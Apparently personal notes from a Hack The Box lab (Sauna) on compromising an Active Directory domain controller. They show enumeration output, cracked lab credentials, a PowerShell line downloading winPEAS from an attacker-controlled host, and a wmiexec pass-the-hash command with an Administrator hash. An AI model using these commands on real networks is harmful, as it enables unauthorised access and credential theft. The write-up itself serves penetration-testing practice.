#### Nmap
```txt
Open 10.129.95.180:80
Open 10.129.95.180:88
Open 10.129.95.180:135
Open 10.129.95.180:139
Open 10.129.95.180:389
Open 10.129.95.180:445
Open 10.129.95.180:464
Open 10.129.95.180:593
Open 10.129.95.180:636
Open 10.129.95.180:5985
Open 10.129.95.180:9389
```

##### Services
- HTTP
- LDAP
- WinRm
- SMB (Message signing enabled and required)

Domain: EGOTISTICAL-BANK.LOCAL

#### HTTP
__Users__
```txt
Fergus Smith
Shaun Coins
Hugo Bear
Hugo Smith
Bowie Taylor
Sophie Driver
Steven Kerb
Johnson
Watson
```

#### SMB
- Anonymous login successful
- Nothing found

#### LDAP
```bash
windapsearch --dc-ip $IP
```
- bind success! Binded as: None
- Functionality
```txt
Functionality Levels:
[+]      domainControllerFunctionality: 2016
[+]      forestFunctionality: 2016
[+]      domainFunctionality: 2016
```
```bash
 ldapsearch -H ldap://$IP -x -b "dc=EGOTISTICAL-BANK,dc=local"
```
` filter: (objectclass=*)`
```txt
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
```
Found one user name
```txt
CN=Hugo Smith
```

#### Username generation
```bash
username-anarchy -i ~/HTB/AD/Sauna/names.txt > ~/HTB/AD/Sauna/usernames.txt
```

#### Asreproasting
```bash
 kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc $IP ./usernames.txt --downgrade
```
_Valid Users_
fsmith
hsmith

_Creds:_ `fsmith:Thestrokes23`

##### Rusthound
```bash
rusthound -d EGOTISTICAL-BANK.LOCAL -u fsmith@EGOTISTICAL-BANK.LOCAL -p Thestrokes23 -i $IP  -o HTB/AD/Sauna/rusthound -z
```

##### Evil-winrm
```bash
 evil-winrm -u fsmith -p Thestrokes23 -i $IP
```

#### Privsec
```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.14.3/winPEASx64.exe',' C:\Users\FSmith\Documents\run.exe')
```
__WinPEAS__
```txt
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```
_samaccountname:_ `svc_loanmgr`

__wmiexec__
```bash
 wmiexec.py EGOTISTICAL-BANK.LOCA/Administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```
